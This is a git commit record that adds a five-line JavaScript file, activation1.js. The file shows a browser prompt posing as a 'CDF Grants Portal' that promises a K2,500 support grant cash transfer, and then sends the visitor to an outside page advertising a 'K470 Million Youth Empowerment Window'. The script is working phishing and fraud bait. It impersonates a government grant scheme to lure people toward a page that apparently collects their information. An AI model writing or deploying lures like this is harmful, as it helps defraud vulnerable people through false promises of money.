a8d8b663d0cc7d4a58eea361ddba118d97787f01
hopiszzx <loladeolumide75@gmail.com>
2025-10-14 23:04:45 +0100

    Create activation1.js

---
+++ activation1.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('CDF Grants Portal: Congratulations, you are eligible to receive the K2,500 Support Grant Cash Transfer, Kindly press OK to submit your information and receive K2,500 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://za-jobs-portal.website/K470-Million-Youth-Empowerment-Window.html';
+}
